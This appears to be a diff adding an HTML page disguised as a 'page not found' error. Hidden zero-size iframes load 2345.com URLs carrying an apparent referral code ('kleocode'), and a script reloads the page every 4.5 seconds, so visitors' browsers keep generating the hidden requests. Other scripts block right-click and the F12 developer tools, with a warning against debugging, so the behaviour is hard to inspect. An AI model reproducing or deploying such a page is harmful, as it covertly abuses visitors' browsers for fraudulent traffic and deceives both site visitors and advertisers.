@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+
+<script type="text/javascript">
+      setInterval("myInterval()",4500);
+      
+       function myInterval()
+       {
+            location.reload();
+        }
+ </script>
+
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="//www.2345.com/?kleocode"></iframe>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="//m.2345.com/?kleocode"></iframe>
+
+<p>We are sorry, the page you requested cannot be found.</p>
+<p>The URL may be misspelled or the page you're looking for is no longer available.</p>
+
+<!--[if lt IE 9]>
+<script src="//lib.baomitu.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+<script src="//lib.baomitu.com/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+<script type="text/javascript">
+document.oncontextmenu = new Function("event.returnValue=false") 
+
+document.onkeydown = function() {
+	if (window.event && window.event.keyCode == 123) {
+		layer.alert("注意！网站禁止调试，如果您强制调试将无法正常使用！")
+		event.keyCode = 0
+		event.returnValue = false
+	}
+	if (window.event && window.event.keyCode == 13) {
+		window.event.keyCode = 505
+	}
+}
+</script>
